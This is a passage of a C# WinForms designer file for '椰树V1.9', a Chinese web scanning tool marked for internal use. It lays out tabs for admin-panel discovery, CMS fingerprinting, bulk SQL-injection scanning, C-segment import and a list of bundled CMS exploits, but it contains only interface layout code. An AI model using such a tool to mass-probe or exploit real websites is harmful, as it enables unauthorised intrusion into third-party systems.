			this.label16.AutoSize = true;
			this.label16.Location = new Point(927, 460);
			this.label16.Name = "label16";
			this.label16.Size = new Size(35, 12);
			this.label16.TabIndex = 17;
			this.label16.Text = "0/100";
			this.progressBar1.Location = new Point(160, 460);
			this.progressBar1.Name = "progressBar1";
			this.progressBar1.Size = new Size(764, 15);
			this.progressBar1.TabIndex = 16;
			this.groupBox6.Controls.Add(this.button32);
			this.groupBox6.Controls.Add(this.label14);
			this.groupBox6.Controls.Add(this.comboBox1);
			this.groupBox6.Controls.Add(this.button2);
			this.groupBox6.Controls.Add(this.label1);
			this.groupBox6.Controls.Add(this.textBox1);
			this.groupBox6.Controls.Add(this.textBox3);
			this.groupBox6.Controls.Add(this.button13);
			this.groupBox6.Location = new Point(4, 0);
			this.groupBox6.Name = "groupBox6";
			this.groupBox6.Size = new Size(665, 41);
			this.groupBox6.TabIndex = 15;
			this.groupBox6.TabStop = false;
			this.button32.Location = new Point(469, 10);
			this.button32.Name = "button32";
			this.button32.Size = new Size(72, 23);
			this.button32.TabIndex = 21;
			this.button32.Text = "二级域名";
			this.button32.UseVisualStyleBackColor = true;
			this.button32.Click += new EventHandler(this.button32_Click);
			this.label14.AutoSize = true;
			this.label14.Location = new Point(547, 15);
			this.label14.Name = "label14";
			this.label14.Size = new Size(41, 12);
			this.label14.TabIndex = 10;
			this.label14.Text = "脚本：";
			this.comboBox1.Items.AddRange(new object[]
			{
				"All",
				"asp",
				"aspx",
				"jsp",
				"php"
			});
			this.comboBox1.Location = new Point(594, 11);
			this.comboBox1.Name = "comboBox1";
			this.comboBox1.Size = new Size(63, 20);
			this.comboBox1.TabIndex = 9;
			this.comboBox1.Text = "All";
			this.button2.Location = new Point(383, 10);
			this.button2.Name = "button2";
			this.button2.Size = new Size(79, 23);
			this.button2.TabIndex = 1;
			this.button2.Text = "查询旁站";
			this.button2.UseVisualStyleBackColor = true;
			this.button2.Click += new EventHandler(this.button2_Click);
			this.label1.AutoSize = true;
			this.label1.Location = new Point(6, 14);
			this.label1.Name = "label1";
			this.label1.Size = new Size(41, 12);
			this.label1.TabIndex = 4;
			this.label1.Text = "域名：";
			this.textBox1.Location = new Point(273, 12);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new Size(103, 21);
			this.textBox1.TabIndex = 3;
			this.textBox3.Location = new Point(53, 11);
			this.textBox3.Name = "textBox3";
			this.textBox3.Size = new Size(126, 21);
			this.textBox3.TabIndex = 7;
			this.button13.Location = new Point(182, 10);
			this.button13.Name = "button13";
			this.button13.Size = new Size(88, 23);
			this.button13.TabIndex = 8;
			this.button13.Text = "解析";
			this.button13.UseVisualStyleBackColor = true;
			this.button13.Click += new EventHandler(this.button13_Click);
			this.label5.AutoSize = true;
			this.label5.Location = new Point(90, 462);
			this.label5.Name = "label5";
			this.label5.Size = new Size(11, 12);
			this.label5.TabIndex = 6;
			this.label5.Text = "0";
			this.label4.AutoSize = true;
			this.label4.Location = new Point(9, 462);
			this.label4.Name = "label4";
			this.label4.Size = new Size(77, 12);
			this.label4.TabIndex = 5;
			this.label4.Text = "一共有网站：";
			this.button14.Location = new Point(686, 6);
			this.button14.Name = "button14";
			this.button14.Size = new Size(117, 40);
			this.button14.TabIndex = 5;
			this.button14.Text = "导出结果";
			this.button14.UseVisualStyleBackColor = true;
			this.button14.Click += new EventHandler(this.button14_Click);
			this.tabPage9.Controls.Add(this.panel1);
			this.tabPage9.Location = new Point(4, 39);
			this.tabPage9.Name = "tabPage9";
			this.tabPage9.Size = new Size(976, 490);
			this.tabPage9.TabIndex = 10;
			this.tabPage9.Text = "web漏洞扫描";
			this.tabPage9.UseVisualStyleBackColor = true;
			this.tabPage3.Controls.Add(this.listView2);
			this.tabPage3.Controls.Add(this.label20);
			this.tabPage3.Controls.Add(this.label2);
			this.tabPage3.Controls.Add(this.progressBar2);
			this.tabPage3.Controls.Add(this.label13);
			this.tabPage3.Controls.Add(this.groupBox4);
			this.tabPage3.Controls.Add(this.listBox3);
			this.tabPage3.Location = new Point(4, 39);
			this.tabPage3.Name = "tabPage3";
			this.tabPage3.Padding = new Padding(3);
			this.tabPage3.Size = new Size(976, 490);
			this.tabPage3.TabIndex = 2;
			this.tabPage3.Text = " 后台扫描 ";
			this.tabPage3.UseVisualStyleBackColor = true;
			this.label2.AutoSize = true;
			this.label2.Location = new Point(929, 444);
			this.label2.Name = "label2";
			this.label2.Size = new Size(35, 12);
			this.label2.TabIndex = 18;
			this.label2.Text = "0/100";
			this.progressBar2.Location = new Point(167, 442);
			this.progressBar2.Name = "progressBar2";
			this.progressBar2.Size = new Size(753, 15);
			this.progressBar2.TabIndex = 17;
			this.label13.AutoSize = true;
			this.label13.Location = new Point(11, 466);
			this.label13.Name = "label13";
			this.label13.Size = new Size(0, 12);
			this.label13.TabIndex = 9;
			this.groupBox4.Controls.Add(this.button24);
			this.groupBox4.Controls.Add(this.button22);
			this.groupBox4.Controls.Add(this.button12);
			this.groupBox4.Controls.Add(this.button11);
			this.groupBox4.Controls.Add(this.button1);
			this.groupBox4.Controls.Add(this.button14);
			this.groupBox4.Location = new Point(164, 3);
			this.groupBox4.Name = "groupBox4";
			this.groupBox4.Size = new Size(816, 46);
			this.groupBox4.TabIndex = 8;
			this.groupBox4.TabStop = false;
			this.listBox3.FormattingEnabled = true;
			this.listBox3.ItemHeight = 12;
			this.listBox3.Location = new Point(7, 9);
			this.listBox3.Name = "listBox3";
			this.listBox3.Size = new Size(152, 448);
			this.listBox3.TabIndex = 0;
			this.listBox7.FormattingEnabled = true;
			this.listBox7.ItemHeight = 12;
			this.listBox7.Location = new Point(7, 11);
			this.listBox7.Name = "listBox7";
			this.listBox7.Size = new Size(195, 448);
			this.listBox7.TabIndex = 4;
			this.groupBox7.BackColor = Color.WhiteSmoke;
			this.groupBox7.BackgroundImageLayout = ImageLayout.Zoom;
			this.groupBox7.Controls.Add(this.label17);
			this.groupBox7.Controls.Add(this.label8);
			this.groupBox7.Controls.Add(this.label7);
			this.groupBox7.Controls.Add(this.label6);
			this.groupBox7.Controls.Add(this.label3);
			this.groupBox7.FlatStyle = FlatStyle.Popup;
			this.groupBox7.Location = new Point(0, 0);
			this.groupBox7.Name = "groupBox7";
            this.groupBox7.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
			this.groupBox7.Size = new Size(975, 469);
			this.groupBox7.TabIndex = 4;
			this.groupBox7.TabStop = false;
			this.groupBox7.Enter += new EventHandler(this.groupBox7_Enter);
			this.label17.AutoSize = true;
			this.label17.Font = new Font("宋体", 15f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.label17.Location = new Point(18, 256);
			this.label17.Name = "label17";
			this.label17.Size = new Size(149, 20);
			this.label17.TabIndex = 4;
			this.label17.Text = "QQ：921388559 ";
			this.label8.AutoSize = true;
			this.label8.Font = new Font("宋体", 15f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.label8.Location = new Point(18, 191);
			this.label8.Name = "label8";
			this.label8.Size = new Size(309, 20);
			this.label8.TabIndex = 3;
			this.label8.Text = "在此感谢椰树大神的无私奉献精神";
			this.label7.AutoSize = true;
			this.label7.Font = new Font("宋体", 15f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.label7.Location = new Point(18, 65);
			this.label7.Name = "label7";
			this.label7.Size = new Size(249, 20);
			this.label7.TabIndex = 2;
			this.label7.Text = "此版本内部共享请勿商业化";
			this.label6.AutoSize = true;
			this.label6.Font = new Font("宋体", 15f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.label6.Location = new Point(18, 129);
			this.label6.Name = "label6";
			this.label6.Size = new Size(149, 20);
			this.label6.TabIndex = 1;
			this.label6.Text = "此版本韩宇更新";
			this.label3.AutoSize = true;
			this.label3.Font = new Font("宋体", 15f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.label3.Location = new Point(18, 17);
			this.label3.Name = "label3";
			this.label3.Size = new Size(329, 20);
			this.label3.TabIndex = 0;
			this.label3.Text = "椰树V1.9 更新了查询接口和部分EXP";
			this.tabPage6.Controls.Add(this.groupBox13);
			this.tabPage6.Controls.Add(this.groupBox10);
			this.tabPage6.Controls.Add(this.groupBox9);
			this.tabPage6.Controls.Add(this.groupBox3);
			this.tabPage6.Location = new Point(4, 39);
			this.tabPage6.Name = "tabPage6";
			this.tabPage6.Size = new Size(976, 490);
			this.tabPage6.TabIndex = 8;
			this.tabPage6.Text = " 后台设置 ";
			this.tabPage6.UseVisualStyleBackColor = true;
			this.groupBox13.Controls.Add(this.label43);
			this.groupBox13.Location = new Point(683, 42);
			this.groupBox13.Name = "groupBox13";
			this.groupBox13.Size = new Size(200, 329);
			this.groupBox13.TabIndex = 7;
			this.groupBox13.TabStop = false;
			this.groupBox13.Text = "使用说明";
			this.label43.AutoSize = true;
			this.label43.Location = new Point(6, 49);
			this.label43.Name = "label43";
			this.label43.Size = new Size(179, 252);
			this.label43.TabIndex = 0;
			this.label43.Text = "这里配置的主要是扫后台的功能:\r\n\r\n1 在后台扫描配置里面选\r\n\r\n   择脚本,然后直接扫描即\r\n\r\n   可(默认是admin.txt,如果\r\n\r\n   选择脚本的话，则是文件\r\n\r\n   夹下面的\"脚本.txt\")\r\n\r\n2 如果为了方便只扫描某个\r\n\r\n  目录的话，则在后台只扫\r\n\r\n  描目录中输入相关的文件\r\n\r\n  夹或者文件。然后点击确\r\n\r\n  定配置按钮即可";
			this.groupBox10.Controls.Add(this.label24);
			this.groupBox10.Controls.Add(this.button23);
			this.groupBox10.Location = new Point(250, 42);
			this.groupBox10.Name = "groupBox10";
			this.groupBox10.Size = new Size(175, 329);
			this.groupBox10.TabIndex = 6;
			this.groupBox10.TabStop = false;
			this.groupBox10.Text = "功能区";
			this.label24.AutoSize = true;
			this.label24.Location = new Point(26, 35);
			this.label24.Name = "label24";
			this.label24.Size = new Size(77, 12);
			this.label24.TabIndex = 4;
			this.label24.Text = "程序没有配置";
			this.button23.Location = new Point(26, 86);
			this.button23.Name = "button23";
			this.button23.Size = new Size(121, 38);
			this.button23.TabIndex = 3;
			this.button23.Text = "确定配置";
			this.button23.UseVisualStyleBackColor = true;
			this.button23.Click += new EventHandler(this.button23_Click);
			this.groupBox9.Controls.Add(this.textBox6);
			this.groupBox9.Controls.Add(this.label23);
			this.groupBox9.Location = new Point(470, 42);
			this.groupBox9.Name = "groupBox9";
			this.groupBox9.Size = new Size(180, 327);
			this.groupBox9.TabIndex = 5;
			this.groupBox9.TabStop = false;
			this.groupBox9.Text = "CMS扫描配置";
			this.textBox6.Location = new Point(6, 84);
			this.textBox6.Multiline = true;
			this.textBox6.Name = "textBox6";
			this.textBox6.Size = new Size(168, 232);
			this.textBox6.TabIndex = 1;
			this.label23.AutoSize = true;
			this.label23.Location = new Point(23, 38);
			this.label23.Name = "label23";
			this.label23.Size = new Size(125, 12);
			this.label23.TabIndex = 0;
			this.label23.Text = "功能正则开发中。。。";
			this.groupBox3.Controls.Add(this.label42);
			this.groupBox3.Controls.Add(this.comboBox3);
			this.groupBox3.Controls.Add(this.textBox5);
			this.groupBox3.Controls.Add(this.label21);
			this.groupBox3.Location = new Point(28, 42);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new Size(180, 329);
			this.groupBox3.TabIndex = 4;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "后台扫描配置";
			this.label42.AutoSize = true;
			this.label42.Location = new Point(12, 38);
			this.label42.Name = "label42";
			this.label42.Size = new Size(35, 12);
			this.label42.TabIndex = 5;
			this.label42.Text = "脚本:";
			this.comboBox3.FormattingEnabled = true;
			this.comboBox3.Items.AddRange(new object[]
			{
				"all",
				"asp",
				"aspx",
				"php",
				"jsp",
				"mdb",
				"fck",
				"dir"
			});
			this.comboBox3.Location = new Point(50, 35);
			this.comboBox3.Name = "comboBox3";
			this.comboBox3.Size = new Size(121, 20);
			this.comboBox3.TabIndex = 2;
			this.comboBox3.Text = "all";
			this.textBox5.Location = new Point(6, 92);
			this.textBox5.Multiline = true;
			this.textBox5.Name = "textBox5";
			this.textBox5.Size = new Size(167, 226);
			this.textBox5.TabIndex = 0;
			this.textBox5.Text = "/admin/\r\n/system/\r\n/HrDemand.asp\r\n/admin/login.asp\r\n/shownews.asp\r\n/member/\r\n/dede/";
			this.label21.AutoSize = true;
			this.label21.Location = new Point(8, 67);
			this.label21.Name = "label21";
			this.label21.Size = new Size(101, 12);
			this.label21.TabIndex = 1;
			this.label21.Text = "后台只扫描目录：";
			this.tabPage4.Controls.Add(this.groupBox7);
			this.tabPage4.Location = new Point(4, 39);
			this.tabPage4.Name = "tabPage4";
			this.tabPage4.Padding = new Padding(3);
			this.tabPage4.Size = new Size(976, 490);
			this.tabPage4.TabIndex = 3;
			this.tabPage4.Text = " 关于椰树 ";
			this.tabPage4.UseVisualStyleBackColor = true;
			this.listBox1.FormattingEnabled = true;
			this.listBox1.ItemHeight = 12;
			this.listBox1.Location = new Point(973, 410);
			this.listBox1.Name = "listBox1";
			this.listBox1.Size = new Size(11, 16);
			this.listBox1.TabIndex = 31;
			this.listBox1.Visible = false;
			this.导出ToolStripMenuItem2.Name = "导出ToolStripMenuItem2";
			this.导出ToolStripMenuItem2.Size = new Size(148, 22);
			this.导出ToolStripMenuItem2.Text = "导出";
			this.导出ToolStripMenuItem2.Click += new EventHandler(this.导出ToolStripMenuItem2_Click);
			this.toolStripMenuItem2.Name = "toolStripMenuItem2";
			this.toolStripMenuItem2.Size = new Size(148, 22);
			this.toolStripMenuItem2.Text = "复制";
			this.toolStripMenuItem2.Click += new EventHandler(this.toolStripMenuItem2_Click);
			this.打开ToolStripMenuItem.Name = "打开ToolStripMenuItem";
			this.打开ToolStripMenuItem.Size = new Size(148, 22);
			this.打开ToolStripMenuItem.Text = "打开";
			this.打开ToolStripMenuItem.Click += new EventHandler(this.打开ToolStripMenuItem_Click);
			this.contextMenuStrip4.Items.AddRange(new ToolStripItem[]
			{
				this.打开ToolStripMenuItem,
				this.toolStripMenuItem2,
				this.导出ToolStripMenuItem2,
				this.导出shellToolStripMenuItem,
				this.导入数据库ToolStripMenuItem
			});
			this.contextMenuStrip4.Name = "contextMenuStrip4";
			this.contextMenuStrip4.Size = new Size(149, 114);
			this.导出shellToolStripMenuItem.Name = "导出shellToolStripMenuItem";
			this.导出shellToolStripMenuItem.Size = new Size(148, 22);
			this.导出shellToolStripMenuItem.Text = "导出成功网址";
			this.导出shellToolStripMenuItem.Click += new EventHandler(this.导出shellToolStripMenuItem_Click);
			this.导入数据库ToolStripMenuItem.Name = "导入数据库ToolStripMenuItem";
			this.导入数据库ToolStripMenuItem.Size = new Size(148, 22);
			this.导入数据库ToolStripMenuItem.Text = "移出安全网址";
			this.导入数据库ToolStripMenuItem.Click += new EventHandler(this.导入数据库ToolStripMenuItem_Click);
			this.label15.AutoSize = true;
			this.label15.Location = new Point(13, 17);
			this.label15.Name = "label15";
			this.label15.Size = new Size(41, 12);
			this.label15.TabIndex = 0;
			this.label15.Text = "网址：";
			this.tabPage5.Controls.Add(this.button25);
			this.tabPage5.Controls.Add(this.listView3);
			this.tabPage5.Controls.Add(this.button21);
			this.tabPage5.Controls.Add(this.label19);
			this.tabPage5.Controls.Add(this.label18);
			this.tabPage5.Controls.Add(this.progressBar3);
			this.tabPage5.Controls.Add(this.button7);
			this.tabPage5.Controls.Add(this.button6);
			this.tabPage5.Controls.Add(this.label10);
			this.tabPage5.Controls.Add(this.button4);
			this.tabPage5.Controls.Add(this.button5);
			this.tabPage5.Controls.Add(this.listBox7);
			this.tabPage5.Location = new Point(4, 39);
			this.tabPage5.Name = "tabPage5";
			this.tabPage5.Size = new Size(976, 490);
			this.tabPage5.TabIndex = 4;
			this.tabPage5.Text = "CMS安全检测";
			this.tabPage5.UseVisualStyleBackColor = true;
			this.button25.Location = new Point(338, 11);
			this.button25.Name = "button25";
			this.button25.Size = new Size(117, 37);
			this.button25.TabIndex = 23;
			this.button25.Text = "C段导入";
			this.button25.UseVisualStyleBackColor = true;
			this.button25.Click += new EventHandler(this.button25_Click);
			this.listView3.ContextMenuStrip = this.contextMenuStrip4;
			this.listView3.Location = new Point(208, 55);
			this.listView3.Name = "listView3";
			this.listView3.Size = new Size(760, 369);
			this.listView3.TabIndex = 22;
			this.listView3.UseCompatibleStateImageBehavior = false;
			this.listView3.TabIndexChanged += new EventHandler(this.listView3_TabIndexChanged);
			this.button21.Location = new Point(724, 11);
			this.button21.Name = "button21";
			this.button21.Size = new Size(117, 37);
			this.button21.TabIndex = 21;
			this.button21.Text = "扫描停止";
			this.button21.UseVisualStyleBackColor = true;
			this.button21.Click += new EventHandler(this.button21_Click);
			this.label19.AutoSize = true;
			this.label19.Location = new Point(212, 437);
			this.label19.Name = "label19";
			this.label19.Size = new Size(0, 12);
			this.label19.TabIndex = 20;
			this.label18.AutoSize = true;
			this.label18.Location = new Point(931, 452);
			this.label18.Name = "label18";
			this.label18.Size = new Size(35, 12);
			this.label18.TabIndex = 19;
			this.label18.Text = "0/100";
			this.progressBar3.Location = new Point(208, 452);
			this.progressBar3.Name = "progressBar3";
			this.progressBar3.Size = new Size(715, 12);
			this.progressBar3.TabIndex = 18;
			this.button7.Location = new Point(851, 11);
			this.button7.Name = "button7";
			this.button7.Size = new Size(117, 37);
			this.button7.TabIndex = 10;
			this.button7.Text = "导出结果";
			this.button7.UseVisualStyleBackColor = true;
			this.button7.Click += new EventHandler(this.button7_Click);
			this.button6.Location = new Point(207, 11);
			this.button6.Name = "button6";
			this.button6.Size = new Size(117, 37);
			this.button6.TabIndex = 9;
			this.button6.Text = "旁站导入";
			this.button6.UseVisualStyleBackColor = true;
			this.button6.Click += new EventHandler(this.button6_Click);
			this.label10.AutoSize = true;
			this.label10.Location = new Point(244, 458);
			this.label10.Name = "label10";
			this.label10.Size = new Size(0, 12);
			this.label10.TabIndex = 8;
			this.button4.Location = new Point(596, 11);
			this.button4.Name = "button4";
			this.button4.Size = new Size(117, 37);
			this.button4.TabIndex = 6;
			this.button4.Text = "Cms识别";
			this.button4.UseVisualStyleBackColor = true;
			this.button4.Click += new EventHandler(this.button4_Click);
			this.button5.Location = new Point(469, 11);
			this.button5.Name = "button5";
			this.button5.Size = new Size(117, 37);
			this.button5.TabIndex = 5;
			this.button5.Text = "外部导入";
			this.button5.UseVisualStyleBackColor = true;
			this.button5.Click += new EventHandler(this.button5_Click);
			this.textBox2.Location = new Point(62, 14);
			this.textBox2.Name = "textBox2";
			this.textBox2.Size = new Size(364, 21);
			this.textBox2.TabIndex = 1;
			this.button8.Location = new Point(467, 14);
			this.button8.Name = "button8";
			this.button8.Size = new Size(75, 23);
			this.button8.TabIndex = 2;
			this.button8.Text = "打开";
			this.button8.UseVisualStyleBackColor = true;
			this.button8.Click += new EventHandler(this.button8_Click);
			this.tabPage7.Controls.Add(this.groupBox8);
			this.tabPage7.Location = new Point(4, 39);
			this.tabPage7.Name = "tabPage7";
			this.tabPage7.Size = new Size(976, 490);
			this.tabPage7.TabIndex = 6;
			this.tabPage7.Text = " 浏 览 器 ";
			this.groupBox8.Controls.Add(this.textBox12);
			this.groupBox8.Controls.Add(this.label40);
			this.groupBox8.Controls.Add(this.textBox11);
			this.groupBox8.Controls.Add(this.label39);
			this.groupBox8.Controls.Add(this.button19);
			this.groupBox8.Controls.Add(this.button18);
			this.groupBox8.Controls.Add(this.button17);
			this.groupBox8.Controls.Add(this.wb_browser);
			this.groupBox8.Controls.Add(this.button8);
			this.groupBox8.Controls.Add(this.textBox2);
			this.groupBox8.Controls.Add(this.label15);
			this.groupBox8.Location = new Point(0, 4);
			this.groupBox8.Name = "groupBox8";
			this.groupBox8.Size = new Size(985, 481);
			this.groupBox8.TabIndex = 0;
			this.groupBox8.TabStop = false;
			this.textBox12.Location = new Point(85, 42);
			this.textBox12.Name = "textBox12";
			this.textBox12.Size = new Size(341, 21);
			this.textBox12.TabIndex = 10;
			this.label40.AutoSize = true;
			this.label40.Location = new Point(13, 47);
			this.label40.Name = "label40";
			this.label40.Size = new Size(53, 12);
			this.label40.TabIndex = 9;
			this.label40.Text = "Referer:";
			this.textBox11.Location = new Point(535, 44);
			this.textBox11.Name = "textBox11";
			this.textBox11.Size = new Size(393, 21);
			this.textBox11.TabIndex = 8;
			this.label39.AutoSize = true;
			this.label39.Location = new Point(471, 49);
			this.label39.Name = "label39";
			this.label39.Size = new Size(47, 12);
			this.label39.TabIndex = 7;
			this.label39.Text = "cookie:";
			this.button19.Location = new Point(855, 12);
			this.button19.Name = "button19";
			this.button19.Size = new Size(75, 23);
			this.button19.TabIndex = 6;
			this.button19.Text = "主页";
			this.button19.UseVisualStyleBackColor = true;
			this.button19.Click += new EventHandler(this.button19_Click);
			this.button18.Location = new Point(731, 12);
			this.button18.Name = "button18";
			this.button18.Size = new Size(75, 23);
			this.button18.TabIndex = 5;
			this.button18.Text = "后退";
			this.button18.UseVisualStyleBackColor = true;
			this.button18.Click += new EventHandler(this.button18_Click);
			this.button17.Location = new Point(602, 14);
			this.button17.Name = "button17";
			this.button17.Size = new Size(75, 23);
			this.button17.TabIndex = 4;
			this.button17.Text = "前进";
			this.button17.UseVisualStyleBackColor = true;
			this.button17.Click += new EventHandler(this.button17_Click);
			this.wb_browser.Location = new Point(4, 74);
			this.wb_browser.MinimumSize = new Size(20, 20);
			this.wb_browser.Name = "wb_browser";
			this.wb_browser.Size = new Size(975, 386);
			this.wb_browser.TabIndex = 3;
			this.wb_browser.Url = new Uri("http://user.qzone.qq.com/921388559", UriKind.Absolute);
			this.wb_browser.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.wb_browser_DocumentCompleted);
			this.tabPage8.Controls.Add(this.label44);
			this.tabPage8.Controls.Add(this.label25);
			this.tabPage8.Location = new Point(4, 39);
			this.tabPage8.Name = "tabPage8";
			this.tabPage8.Size = new Size(976, 490);
			this.tabPage8.TabIndex = 7;
			this.tabPage8.Text = "漏洞收录查询";
			this.tabPage8.UseVisualStyleBackColor = true;
			this.label44.AutoSize = true;
			this.label44.Location = new Point(410, 50);
			this.label44.Name = "label44";
			this.label44.Size = new Size(131, 180);
			this.label44.TabIndex = 2;
			this.label44.Text = "14 5ucms测试\r\n\r\n15 w78cms测试\r\n\r\n16 易想团购CMS测试\r\n\r\n17 cmseasy上传漏洞\r\n\r\n18 struts2漏洞测试\r\n\r\n19 iis写漏洞测试\r\n\r\n20 B2Bbuilder漏洞测试\r\n\r\n21 08cms注入漏洞";
			this.label25.AutoSize = true;
			this.label25.Location = new Point(45, 26);
			this.label25.Name = "label25";
			this.label25.Size = new Size(359, 324);
			this.label25.TabIndex = 1;
			this.label25.Text = resources.GetString("label25.Text");
			this.tabControl1.Controls.Add(this.tabPage9);
			this.tabControl1.Controls.Add(this.tabPage1);
			this.tabControl1.Controls.Add(this.tabPage2);
			this.tabControl1.Controls.Add(this.tabPage3);
			this.tabControl1.Controls.Add(this.tabPage5);
			this.tabControl1.Controls.Add(this.tabPage10);
			this.tabControl1.Controls.Add(this.tabPage7);
			this.tabControl1.Controls.Add(this.tabPage8);
			this.tabControl1.Controls.Add(this.tabPage6);
			this.tabControl1.Controls.Add(this.tabPage4);
			this.tabControl1.ItemSize = new Size(35, 35);
			this.tabControl1.Location = new Point(0, -2);
			this.tabControl1.Multiline = true;
			this.tabControl1.Name = "tabControl1";
			this.tabControl1.SelectedIndex = 0;
			this.tabControl1.Size = new Size(984, 533);
			this.tabControl1.SizeMode = TabSizeMode.FillToRight;
			this.tabControl1.TabIndex = 32;
			this.tabPage10.Controls.Add(this.button29);
			this.tabPage10.Controls.Add(this.button28);
			this.tabPage10.Controls.Add(this.button27);
			this.tabPage10.Controls.Add(this.button26);
			this.tabPage10.Controls.Add(this.label38);
			this.tabPage10.Controls.Add(this.label37);
			this.tabPage10.Controls.Add(this.listBox6);
			this.tabPage10.Controls.Add(this.listBox5);
			this.tabPage10.Controls.Add(this.listBox4);
			this.tabPage10.Location = new Point(4, 39);
			this.tabPage10.Name = "tabPage10";
			this.tabPage10.Size = new Size(976, 490);
			this.tabPage10.TabIndex = 11;
			this.tabPage10.Text = "批量扫注入";
			this.tabPage10.UseVisualStyleBackColor = true;
			this.button29.Location = new Point(485, 15);
			this.button29.Name = "button29";
			this.button29.Size = new Size(116, 26);
			this.button29.TabIndex = 8;
			this.button29.Text = "C段导入";
			this.button29.UseVisualStyleBackColor = true;
			this.button29.Click += new EventHandler(this.button29_Click);
			this.button28.Location = new Point(338, 15);
			this.button28.Name = "button28";
			this.button28.Size = new Size(116, 26);
			this.button28.TabIndex = 7;
			this.button28.Text = "旁站导入";
			this.button28.UseVisualStyleBackColor = true;
			this.button28.Click += new EventHandler(this.button28_Click);
			this.button27.Location = new Point(769, 15);
			this.button27.Name = "button27";
			this.button27.Size = new Size(116, 26);
			this.button27.TabIndex = 6;
			this.button27.Text = "批量扫描";
			this.button27.UseVisualStyleBackColor = true;
			this.button27.Click += new EventHandler(this.button27_Click);
			this.button26.Location = new Point(630, 15);
			this.button26.Name = "button26";
			this.button26.Size = new Size(113, 26);
			this.button26.TabIndex = 5;
			this.button26.Text = "批量导入";
			this.button26.UseVisualStyleBackColor = true;
			this.button26.Click += new EventHandler(this.button26_Click);
			this.label38.AutoSize = true;
			this.label38.Location = new Point(220, 32);
			this.label38.Name = "label38";
			this.label38.Size = new Size(101, 12);
			this.label38.TabIndex = 4;
			this.label38.Text = "采集的网站链接：";
			this.label37.AutoSize = true;
			this.label37.Location = new Point(220, 238);
			this.label37.Name = "label37";
			this.label37.Size = new Size(53, 12);
			this.label37.TabIndex = 3;
			this.label37.Text = "注入点：";
			this.listBox6.ContextMenuStrip = this.contextMenuStrip5;
			this.listBox6.FormattingEnabled = true;
			this.listBox6.ItemHeight = 12;
			this.listBox6.Location = new Point(220, 260);
			this.listBox6.Name = "listBox6";
			this.listBox6.Size = new Size(748, 196);
			this.listBox6.TabIndex = 2;
			this.contextMenuStrip5.Items.AddRange(new ToolStripItem[]
			{
				this.复制ToolStripMenuItem2,
				this.全部导出ToolStripMenuItem
			});
			this.contextMenuStrip5.Name = "contextMenuStrip5";
			this.contextMenuStrip5.Size = new Size(125, 48);
			this.复制ToolStripMenuItem2.Name = "复制ToolStripMenuItem2";
			this.复制ToolStripMenuItem2.Size = new Size(124, 22);
			this.复制ToolStripMenuItem2.Text = "复制";
			this.复制ToolStripMenuItem2.Click += new EventHandler(this.复制ToolStripMenuItem2_Click);
			this.全部导出ToolStripMenuItem.Name = "全部导出ToolStripMenuItem";
			this.全部导出ToolStripMenuItem.Size = new Size(124, 22);
			this.全部导出ToolStripMenuItem.Text = "全部导出";
			this.全部导出ToolStripMenuItem.Click += new EventHandler(this.全部导出ToolStripMenuItem_Click);
			this.listBox5.FormattingEnabled = true;
			this.listBox5.ItemHeight = 12;
			this.listBox5.Location = new Point(219, 47);
			this.listBox5.Name = "listBox5";
			this.listBox5.Size = new Size(749, 184);
			this.listBox5.TabIndex = 1;
			this.listBox4.FormattingEnabled = true;
			this.listBox4.ItemHeight = 12;
			this.listBox4.Location = new Point(3, 9);
			this.listBox4.Name = "listBox4";
			this.listBox4.Size = new Size(210, 448);
			this.listBox4.TabIndex = 0;
			this.contextMenuStrip6.Items.AddRange(new ToolStripItem[]
			{
				this.复制ToolStripMenuItem3,
				this.导出ToolStripMenuItem3
			});
			this.contextMenuStrip6.Name = "contextMenuStrip6";
			this.contextMenuStrip6.Size = new Size(101, 48);
			this.复制ToolStripMenuItem3.Name = "复制ToolStripMenuItem3";
			this.复制ToolStripMenuItem3.Size = new Size(100, 22);
			this.复制ToolStripMenuItem3.Text = "复制";
			this.导出ToolStripMenuItem3.Name = "导出ToolStripMenuItem3";
			this.导出ToolStripMenuItem3.Size = new Size(100, 22);
			this.导出ToolStripMenuItem3.Text = "导出";
			this.ScanTimer.Enabled = true;
			this.ScanTimer.Interval = 2500;
			this.AdTimer.Enabled = true;
			this.AdTimer.Interval = 90000;
			base.AutoScaleDimensions = new SizeF(6f, 12f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = SystemColors.ButtonFace;
			base.ClientSize = new Size(987, 531);
			base.Controls.Add(this.listBox1);
			base.Controls.Add(this.tabControl1);
			base.Icon = (Icon)resources.GetObject("$this.Icon");
			base.IsMdiContainer = true;
			base.MaximizeBox = false;
			base.Name = "FormMain";
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "椰树V1.9--Web安全扫描工具  内部版请勿外传";
			base.TransparencyKey = Color.WhiteSmoke;
			base.FormClosing += new FormClosingEventHandler(this.FormMain_FormClosing);
			base.Load += new EventHandler(this.FormMain_Load);
			base.Resize += new EventHandler(this.FormMain_Resize);
			this.contextMenuStrip2.ResumeLayout(false);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			this.splitMain.Panel1.ResumeLayout(false);
			this.splitMain.ResumeLayout(false);
			this.toolStripData.ResumeLayout(false);
			this.toolStripData.PerformLayout();
			this.toolStripURL.ResumeLayout(false);
			this.toolStripURL.PerformLayout();
			this.statusStripMain.ResumeLayout(false);
			this.statusStripMain.PerformLayout();
			this.toolStripMain.ResumeLayout(false);
			this.toolStripMain.PerformLayout();
			this.contextMenuStrip3.ResumeLayout(false);
			this.tabPage2.ResumeLayout(false);
			this.tabPage2.PerformLayout();
			this.groupBox5.ResumeLayout(false);
			this.groupBox5.PerformLayout();
			this.tabPage1.ResumeLayout(false);
			this.tabPage1.PerformLayout();
			this.groupBox12.ResumeLayout(false);
			this.groupBox11.ResumeLayout(false);
			this.groupBox11.PerformLayout();
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			this.groupBox2.ResumeLayout(false);
			this.groupBox2.PerformLayout();
